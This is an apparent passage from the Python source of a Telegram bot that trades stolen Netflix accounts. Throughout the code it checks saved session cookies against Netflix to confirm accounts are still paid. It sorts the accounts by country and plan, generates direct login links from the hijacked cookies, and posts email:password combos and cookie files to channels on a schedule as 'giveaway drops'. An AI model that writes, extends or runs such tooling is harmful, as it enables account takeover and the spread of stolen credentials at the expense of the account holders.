                    temp_zip_path = temp_zip.name

                with zipfile.ZipFile(temp_zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                    for country, categories in files.items():
                        for cat, contents in categories.items():
                            if contents:
                                folder_name = "NA" if cat == "N/A" else cat
                                zf.writestr(f"{country}/{folder_name}/Valid.txt", "\n\n".join(contents))

                total_items = sum(sum(len(items) for items in cats.values()) for cats in files.values())
                with open(temp_zip_path, "rb") as f:
                    await query.message.reply_document(
                        document=f,
                        filename="Country_Filtered.zip",
                        caption=f"✅ Here is your Country Filtered ZIP! (Found {total_items} Valid)",
                    )
            except Exception as e:
                logger.error(f"Failed to send zip document: {e}")
                try:
                    await query.message.reply_text("✅ Filtered accounts, but failed to send the ZIP file!")
                except Exception:
                    pass
            finally:
                if temp_zip_path and os.path.exists(temp_zip_path):
                    try:
                        os.remove(temp_zip_path)
                    except Exception:
                        pass
        else:
            for country, categories in files.items():
                for cat, contents in categories.items():
                    if contents:
                        folder_name = "NA" if cat == "N/A" else cat
                        txt_buffer = io.BytesIO(("\n\n".join(contents)).encode("utf-8"))
                        txt_buffer.name = f"{country}_{folder_name}.txt"
                        try:
                            await query.message.reply_document(document=txt_buffer)
                        except Exception as e:
                            logger.error(f"Failed to send txt document: {e}")
                        await asyncio.sleep(1)  # Prevent Telegram FloodWait
            try:
                await query.message.reply_text("✅ All country & category TXT files sent!")
            except Exception:
                pass

        try:
            await query.message.delete()
        except Exception:
            pass
    finally:
        context.user_data.pop("country_files", None)
        context.user_data.pop("pending_items", None)
        context.user_data.pop("txt_count", None)
        context.user_data.pop("scan_breakdown", None)
        context.user_data.pop("debounce_counter", None)


async def post_giveaway_logic(channels, bot):
    """Fetches a random cookie, generates its direct link, and posts it to channels."""
    while True:
        try:
            stock = await db.get_random_active_stock()
            if not stock:
                logger.info("No stock available for giveaway.")
                return False

            email = stock["email"]
            cookies_str = stock["cookies"]
            country = utils.get_full_country_name(stock.get("country", "Unknown"))
            raw_plan = stock.get("plan", "N/A")
            plan = db.standardize_plan(raw_plan)
            password = stock.get("password")

            cookies_list = utils.parse_netflix_cookies(cookies_str)
            if not cookies_list:
                logger.warning(f"Giveaway failed for {email}, invalid cookies in DB. Fetching another one...")
                await db.remove_stock(email)
                continue
            # Strict Premium Check: Verify the account hasn't expired since it was saved to DB
            account_info = await utils.scraper.fetch_enhanced_account_details(cookies_list)

            if isinstance(account_info, dict) and account_info.get("error") == "rate_limit":
                logger.warning(f"Netflix rate-limit detected while checking {email}. Aborting current drop.")
                return False

            if not utils.is_healthy_stock(account_info):
                logger.warning(
                    f"Giveaway account {email} is dead (payment removed, on hold, or expired). Removing from DB and trying next..."
                )
                await db.remove_stock(email)
                continue

            # We must generate a fresh direct login link because the old one might have expired
            direct_link = await utils.scraper.generate_direct_login_link_api(cookies_list)

            has_direct_link = direct_link and str(direct_link).startswith("http")
            if has_direct_link:
                link_line = f"🔗 *Direct Login Link:* [Click Here to Login]({direct_link})"
                file_link = f"Direct Link: {direct_link}\n\n"
            else:
                link_line = "🍪 *Login:* Import attached cookies file via Cookie-Editor"
                file_link = ""

            msg = (
                f"🎁 *New Drop!*\n\n"
                f"🌍 *Country:* {country}\n"
                f"📺 *Plan:* {plan}\n\n"
                f"{link_line}\n\n"
                f"🌟 *Provided By:* @iq4u8 & @xxbga\n"
                f"📢 *Join us:* [Giveaway Hub](https://t.me/givaway_hub)"
            )

            file_content = (
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌟 Provided By: @iq4u8 & @xxbga 🌟\n"
                "📢 Join us: https://t.me/givaway_hub\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            )
            file_content += file_link
            if password:
                file_content += f"Combo: {email}:{password}\n\n"
            file_content += f"Cookies:\n{cookies_str}\n"

            # Concurrently broadcast drop to all channels without waiting in a serial queue
            async def _send_to_single_channel(cid):
                try:
                    import io

                    txt_buffer = io.BytesIO(file_content.encode("utf-8"))
                    txt_buffer.name = f"{email}_account.txt"

                    await bot.send_document(chat_id=cid, document=txt_buffer, caption=msg, parse_mode="Markdown")
                    return True
                except Exception as e:
                    logger.error(f"Failed to send giveaway to channel {cid}: {e}")
                    return False

            results = await asyncio.gather(*(_send_to_single_channel(cid) for cid in channels), return_exceptions=True)
            success = any(res is True for res in results)

            if success:
                await db.remove_stock(email)
                logger.info(f"Successfully gave away {email} and removed from stock.")
            else:
                logger.error(f"Failed to give away {email} to ANY channel. Keeping in stock.")
            return True
        except Exception as e:
            logger.error(f"Unexpected error in giveaway loop: {e}")
            await asyncio.sleep(5)
            continue


async def daily_cleanup():
    """Scans all stock, checks if they are still valid, removes dead ones."""
    logger.info("Starting daily cleanup...")
    cursor = await db.get_all_active_stock()
    async for stock in cursor:
        email = stock["email"]
        cookies_list = utils.parse_netflix_cookies(stock.get("cookies", ""))
        if not cookies_list:
            await db.remove_stock(email)
            logger.info(f"Removed dead stock (invalid cookies): {email}")
            continue

        account_info = await utils.scraper.fetch_enhanced_account_details(cookies_list)
        if isinstance(account_info, dict) and account_info.get("error") == "rate_limit":
            # Do not delete on rate limit, pause and let it cool down
            await asyncio.sleep(10)
            continue

        if not utils.is_healthy_stock(account_info):
            await db.remove_stock(email)
            logger.info(f"Removed dead/no-payment stock: {email}")

        await asyncio.sleep(1.5)  # Rate limit safety
    logger.info("Daily cleanup finished.")


async def background_drop_task(app):
    """Runs continuously and triggers drops based on DB settings interval."""

    while True:
        try:
            settings = await db.get_settings()
            delay_minutes = settings.get("drop_interval_minutes", 120)
            last_drop_date = settings.get("last_drop_time")
            drops_today = settings.get("drops_today", 0)
            max_drops = settings.get("drops_per_day", 3)
            channels = settings.get("channels", [])

            if not channels:
                channels = CHANNEL_IDS

            now = datetime.now(UTC)

            do_drop = False

            if last_drop_date:
                # Make timezone-aware if naive
                if last_drop_date.tzinfo is None:
                    last_drop_date = last_drop_date.replace(tzinfo=UTC)

                # Reset drops if new day
                if last_drop_date.date() < now.date():
                    drops_today = 0
                    await db.update_settings({"drops_today": 0})

                # Check if enough time has passed since last drop
                time_since_last = (now - last_drop_date).total_seconds() / 60
                if time_since_last >= delay_minutes:
                    do_drop = True
            else:
                do_drop = True  # First time ever dropping

            if do_drop and drops_today < max_drops and channels:
                success = await post_giveaway_logic(channels, app.bot)
                if success:
                    await db.update_settings({"drops_today": drops_today + 1, "last_drop_time": now})
        except Exception as e:
            logger.error(f"Error in background_drop_task: {e}")

        # Wait 60 seconds before checking again
        await asyncio.sleep(60)


def daily_scheduler_job():
    """Runs once a day to do cleanup."""
    asyncio.create_task(daily_cleanup())


async def post_init(app: Application):
    # Setup scheduler
    scheduler.add_job(daily_scheduler_job, "cron", hour=0, minute=0)
    scheduler.start()

    # Start the dynamic background task for auto drops
    asyncio.create_task(background_drop_task(app))
    logger.info("Giveaway Bot is running...")


async def clear_pending_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    context.user_data.pop("pending_items", None)
    context.user_data.pop("country_files", None)
    context.user_data.pop("txt_count", None)
    context.user_data.pop("scan_breakdown", None)
    context.user_data.pop("debounce_counter", None)
    context.user_data.pop("stop_process", None)
    await query.edit_message_text("🗑️ *Pending items cleared.*", parse_mode="Markdown")


def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN is missing in .env")
        return

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stock", stock_command))

    # Start menu alerts
    app.add_handler(CallbackQueryHandler(start_alert_callback, pattern="^start_alert$"))

    # Submenus
    app.add_handler(CallbackQueryHandler(submenu_processing_callback, pattern="^submenu_processing$"))
    app.add_handler(CallbackQueryHandler(submenu_stock_callback, pattern="^submenu_stock$"))
    app.add_handler(CallbackQueryHandler(submenu_settings_callback, pattern="^submenu_settings$"))
    app.add_handler(CallbackQueryHandler(main_menu_callback, pattern="^main_menu$"))

    # Settings callback
    app.add_handler(CallbackQueryHandler(settings_action_callback, pattern="^settings_"))

    # Menu callbacks
    app.add_handler(CallbackQueryHandler(clear_pending_callback, pattern="^clear_pending$"))
    app.add_handler(CallbackQueryHandler(process_valid, pattern="^menu_valid$"))
    app.add_handler(CallbackQueryHandler(process_crunchy, pattern="^menu_crunchy$"))
    app.add_handler(CallbackQueryHandler(process_country_filter, pattern="^menu_country$"))
    app.add_handler(CallbackQueryHandler(process_stock, pattern="^menu_stock$"))
    app.add_handler(CallbackQueryHandler(stop_job_callback, pattern="^stop_job_"))
    app.add_handler(CallbackQueryHandler(menu_close, pattern="^menu_close$"))
    app.add_handler(CallbackQueryHandler(menu_stop, pattern="^menu_stop$"))
    app.add_handler(CallbackQueryHandler(send_country_format, pattern="^format_(zip|txt)$"))

    # Original stock dashboard callbacks
    app.add_handler(CallbackQueryHandler(stock_callback))

    app.add_handler(MessageHandler(filters.Document.ALL | filters.TEXT & ~filters.COMMAND, handle_input))

    app.run_polling()


if __name__ == "__main__":
    main()
